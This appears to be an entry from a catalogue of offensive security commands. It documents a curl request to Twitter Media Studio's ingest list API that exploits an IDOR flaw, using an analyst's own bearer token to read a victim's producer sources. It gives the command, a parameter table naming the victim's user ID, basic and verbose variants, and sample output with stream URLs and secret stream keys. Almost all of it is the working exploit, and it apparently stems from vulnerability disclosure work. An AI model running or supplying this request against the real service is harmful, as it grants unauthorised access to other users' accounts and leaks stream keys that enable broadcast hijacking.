---
data: >-
  curl -X GET
  "https://studio.twitter.com/1/live/ingest/list.json?account_id=ACCOUNT_ID&owner_id=OWNER_ID&user_id=USER_ID"
  -H "Authorization: Bearer SESSION_TOKEN"
tags:
  - api
  - disclosure
  - twitter
type: command
output: JSON response containing source details
executor: curl
platforms:
  - Web
id: f27c66cd-a03e-4f49-b698-1a1a7963bc49
created_at: '2025-12-14T17:25:13.074Z'
updated_at: '2025-12-14T17:25:13.074Z'
verified: false
validated: true
submitted: true
---
# twitter-ingest-list-get

## Command

```bash
curl -X GET "https://studio.twitter.com/1/live/ingest/list.json?account_id=ACCOUNT_ID&owner_id=OWNER_ID&user_id=USER_ID" -H "Authorization: Bearer SESSION_TOKEN"
```

## Description

This command sends a GET request to Twitter Media Studio's ingest list API endpoint to retrieve producer source information, exploiting IDOR to access victim data using analyst credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `account_id` | ID of the target account from network inspection | Yes |
| `owner_id` | Victim's user ID | Yes |
| `user_id` | Analyst's user ID | Yes |
| `SESSION_TOKEN` | Bearer token from active browser session | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://studio.twitter.com/1/live/ingest/list.json?account_id=12345&owner_id=67890&user_id=11111" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X GET "https://studio.twitter.com/1/live/ingest/list.json?account_id=12345&owner_id=67890&user_id=11111" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

## Expected Output

Successful response is a JSON object with an array of sources, each including fields like "name", "url", and "key", e.g., {"sources": [{"name": "Victim Source", "url": "rtmp://example.com", "key": "secretkey123"}]}.

## Related

- [[Related Procedure]]
